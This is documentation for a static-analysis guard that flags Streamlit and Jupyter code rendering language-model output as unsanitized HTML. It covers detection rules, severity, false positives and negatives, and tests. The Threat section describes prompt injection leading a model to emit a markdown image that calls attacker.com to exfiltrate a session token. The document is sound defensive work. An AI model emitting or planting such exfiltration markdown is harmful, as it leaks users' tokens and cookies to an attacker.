---
type: Guard
title: "markdown-render-xss"
description: "LLM output rendered as executable HTML without sanitization."
timestamp: "2026-10-01T18:10:09+00:00"
guard_id: "markdown-render-xss"
checklist_section: ["3b"]
standards: ["OWASP-LLM:LLM02"]
---

# LLM output rendered as executable HTML without sanitization

**Guard ID:** `markdown-render-xss`
**Module:** `agentsec/guards/markdown_render_xss.py`
**Severity:** HIGH (streamlit-unsafe-html), MEDIUM (ipython-html-display), HIGH (streamlit-html-call)
**Standards:** OWASP-LLM:LLM02

## Threat

When an LLM application renders model output as executable HTML — in a Streamlit UI, a Jupyter
notebook, or a web view — a successful prompt injection attack can produce content that causes
exfiltration, XSS, or UI redress when the output is displayed.

The canonical payload is a markdown image reference:

```
Here is your answer: ![](https://attacker.com/collect?token=SESSION_TOKEN)
```

When Streamlit renders this with `unsafe_allow_html=True`, the browser fetches the attacker URL,
exfiltrating anything the attacker embedded in the query string — session cookies, API keys, or
any value reachable via JavaScript. No user interaction required: the attack fires on page render.

## Detection design

Three checks:

### `streamlit-unsafe-html` (HIGH)

**Signal:** A line in a Python file that calls `st.markdown(...)` with `unsafe_allow_html=True`
as a keyword argument (any position, any whitespace around `=`).

```python
# Fires:
st.markdown(model_response, unsafe_allow_html=True)
st.markdown(unsafe_allow_html=True, body=model_response)

# Silent (safe defaults):
st.markdown(model_response)                       # default: unsafe_allow_html=False
st.markdown(model_response, unsafe_allow_html=False)
```

**Why explicit opt-in?** Streamlit's default behavior strips `<script>`, `<img>`, and `<iframe>`
tags from rendered content. The `unsafe_allow_html=True` flag is an explicit security downgrade
that bypasses this sanitization. Its presence is a reliable high-signal indicator: it almost
always means model output (or other untrusted content) will be rendered as raw HTML.

### `ipython-html-display` (MEDIUM)

**Signal:** A line containing `IPython.display.HTML(` or `display(HTML(`. A standalone
`HTML(` call no longer fires: it matched argparse help strings and other non-display uses.

```python
# Fires:
from IPython.display import HTML
display(HTML(model_response))           # Jupyter notebook rendering
IPython.display.HTML(model_response)    # module form

# Silent:
HTML("<h1>Hello</h1>")                  # standalone HTML(, not a display call
display(Markdown(model_response))       # Markdown display sanitizes tags
```

**Granularity:** one finding per display line, across every scanned file, matching the two
streamlit rules. Until #425 (which absorbed #586) this rule returned on the first hit repo-wide,
so ten notebooks rendering model output as HTML reported one finding.

**Severity: MEDIUM** — Jupyter notebooks are primarily local or internal tools. The attack
surface is narrower than a deployed Streamlit app: the payload executes when the notebook is
opened or exported, not when an arbitrary end-user visits a page. Still exploitable when
notebooks are shared, hosted (JupyterHub, Google Colab), or rendered via nbconvert.

### `streamlit-html-call` (HIGH)

**Signal:** A line calling `st.html(...)`. Unlike `st.markdown()`, this Streamlit API (added
in 1.30) has no `unsafe_allow_html` opt-in at all — the call itself is the unsafe sink, since
every invocation renders its argument as raw HTML unconditionally.

```python
# Fires:
st.html(model_response)
st.html(
    model_response,
)

# Silent:
st.markdown(model_response)         # different API — see streamlit-unsafe-html above
st.html_component_registry.get(x)   # not a call to st.html(...)
```

**Why no flag to check?** `st.markdown()` has a safe default (`unsafe_allow_html=False`) that
this guard's first check looks for a bypass of. `st.html()` has no such default — there is no
safe-mode case to rule out, so the bare call site is the finding. This makes it arguably a
higher-confidence signal than `streamlit-unsafe-html`.

**Suppress conditions:**
- Any file contains `# security: allow-markdown-xss`

## Severity rationale

HIGH for `streamlit-unsafe-html`: this is a deployed-app pattern where anonymous users may
trigger the render. The exfiltration attack is passive (fires on page load, no interaction).

MEDIUM for `ipython-html-display`: narrower deployment surface (local/internal notebooks), but
the same attack applies when notebooks are shared or published.

HIGH for `streamlit-html-call`: same deployed-app, no-interaction, passive-render pattern as
`streamlit-unsafe-html`, with no safe-default case to exclude.

## Known bypasses / false negatives

| Pattern | Caught? | Notes |
|---|---|---|
| `st.markdown(unsafe_allow_html=True, body=resp)` | Yes | Any arg position caught |
| `st.markdown(resp, unsafe_allow_html = True)` | Yes | Spaces around `=` |
| `response = resp; st.markdown(response, unsafe_allow_html=True)` | Yes | Variable reference OK |
| `st.html(model_output)` | Yes | Detected by `streamlit-html-call` |
| `render = st.html; render(model_output)` | No (FN) | Aliased/reassigned callable — no dataflow analysis, same limitation as the rest of this guard |
| `render_markdown(resp, html=True)` | No (FN) | Custom renderer — no fixed, enumerable API surface to regex against |
| `st.write(model_output)` | No (FN) | `st.write` auto-escapes HTML by default |
| `bleach.clean(resp)` + `st.markdown(..., unsafe_allow_html=True)` | Yes (FP) | Flag with pragma |

## False positive scenarios

| Pattern | Would fire | Response |
|---|---|---|
| Static HTML: `st.markdown("<b>hello</b>", unsafe_allow_html=True)` | Yes | FP — suppress with pragma if content is truly static/trusted |
| Admin page rendering trusted HTML from database | Yes | FP — suppress with pragma after audit |
| Static HTML: `st.html("<style>.foo{color:red}</style>")` | Yes | FP — same accepted class as the static-HTML case above (common Streamlit CSS-injection idiom); suppress with pragma if content is truly static/trusted |
| Code example inside a docstring (`"""Call st.html(answer)..."""`) | No (fixed 2026-09-03) | Was a FP (review M6) — triple-quoted string/docstring content is now blanked (`strip_python_strings`) before matching, same convention other guards use. A single-line string literal containing the pattern is NOT blanked — the codebase-wide accepted trade-off `strip_python_strings` documents. |

## Checklist items flipped

| Item ID | Before | After | Reason |
|---|---|---|---|
| `3b-markdown-exfiltration` | `manual` | `partial` | Catches Streamlit (`st.markdown(unsafe_allow_html=True)`, `st.html()`) and Jupyter sinks; custom in-house HTML renderers/template filters still not detected — no fixed, enumerable API surface to regex against for those |

## Tests

| Test | Validates |
|---|---|
| `test_markdown_render_xss_flags_streamlit_unsafe_html` | `st.markdown(answer, unsafe_allow_html=True)` fires HIGH |
| `test_markdown_render_xss_flags_unsafe_html_kwarg_reordered` | Kwarg in any position fires |
| `test_markdown_render_xss_flags_ipython_html` | `display(HTML(output))` fires MEDIUM |
| `test_markdown_render_xss_flags_ipython_module_form` | `IPython.display.HTML(resp)` fires |
| `test_markdown_render_xss_silent_for_safe_streamlit_markdown` | `st.markdown(resp)` (no flag) is silent |
| `test_markdown_render_xss_silent_for_explicit_false` | `unsafe_allow_html=False` is silent |
| `test_markdown_render_xss_pragma_silences` | Pragma silences both checks |
| `test_markdown_render_xss_not_applicable_without_llm_feature` | `applies()` gates on `"llm"` |
| `test_markdown_render_xss_flags_streamlit_html_call` | `st.html(answer)` fires HIGH |
| `test_markdown_render_xss_flags_multiline_streamlit_html_call` | Black-formatted `st.html(\n    answer,\n)` fires |
| `test_markdown_render_xss_streamlit_html_call_pragma_silences` | Pragma silences `streamlit-html-call` too |
| `test_markdown_render_xss_silent_for_st_markdown_fp_bait` | `st.markdown(resp)` and `st.html_component_registry.get(...)` stay silent under the new check |
| `test_markdown_render_xss_silent_for_st_html_in_docstring` | A code EXAMPLE inside a docstring (`"""Call st.html(answer)..."""`) stays silent (FP-bait, review M6) |
| `test_markdown_render_xss_reports_every_ipython_html_display` | Every IPython HTML display line in every file is reported, not just the first (#425, #586) |
| `test_markdown_render_xss_benign_display_after_a_hit_stays_silent` | A `Markdown` display, a docstring example and an argparse `HTML(` string after a real hit stay silent (FP-bait for the #425 widening) |
| `test_markdown_render_xss_pragma_in_third_file_silences_every_ipython_display` | The repo-wide pragma still silences every file after #425 |

# Citations

[1] agentsec checklist item `3b-markdown-exfiltration` (§3b)
[2] OWASP-LLM:LLM02
